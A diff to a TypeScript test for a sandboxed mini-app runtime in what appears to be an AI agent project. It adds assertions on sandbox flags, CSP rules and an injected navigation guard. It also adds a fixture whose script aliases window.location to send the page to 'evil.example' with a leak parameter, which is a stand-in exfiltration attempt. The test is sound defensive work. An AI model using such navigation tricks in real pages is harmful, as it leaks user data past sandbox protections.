@@ -43,14 +43,29 @@ async function main(): Promise<void> {
     assert.match(shell, /sandbox="allow-scripts allow-modals allow-pointer-lock"/);
     assert.doesNotMatch(shell, /allow-forms/);
     assert.doesNotMatch(shell, /allow-same-origin/);
+    assert.match(shell, /cannot enforce navigation isolation/);
     const encodedApp = shell.match(/atob\("([A-Za-z0-9+/=]+)"\)/)?.[1];
     assert.ok(encodedApp, "embedded mini-app payload is present");
     const securedApp = Buffer.from(encodedApp, "base64").toString("utf8");
     assert.match(securedApp, /form-action 'none'/);
     assert.match(securedApp, /navigate-to 'none'/);
     assert.match(securedApp, /connect-src 'none'/);
+    assert.match(securedApp, /Navigation isolation is unavailable in this browser/);
+    assert.match(securedApp, /addEventListener\('navigate'/);
     assert.match(shell, /agent-turn/);
     assert.match(shell, /jarvis-host/);
+
+    const aliasNavigation = "<!doctype html><html><head><script>const target=window.location;target.href='https://evil.example/?leak=1';</script></head><body></body></html>";
+    const aliasShell = renderProjectAppShell("project-1", manifest, aliasNavigation, token);
+    const aliasPayload = aliasShell.match(/atob\("([A-Za-z0-9+/=]+)"\)/)?.[1];
+    assert.ok(aliasPayload, "alias-navigation mini-app payload is present");
+    const securedAliasApp = Buffer.from(aliasPayload, "base64").toString("utf8");
+    const guardIndex = securedAliasApp.indexOf("const navigationApi=globalThis.navigation");
+    const appIndex = securedAliasApp.indexOf("const target=window.location");
+    assert.ok(guardIndex >= 0, "navigation guard is injected");
+    assert.ok(appIndex >= 0, "alias navigation fixture remains present for runtime enforcement");
+    assert.ok(guardIndex < appIndex, "navigation guard executes before app code");
+
     console.log("projectAppRuntime tests passed");
   } finally {
     if (previousSecret == null) delete process.env.JWT_SECRET;
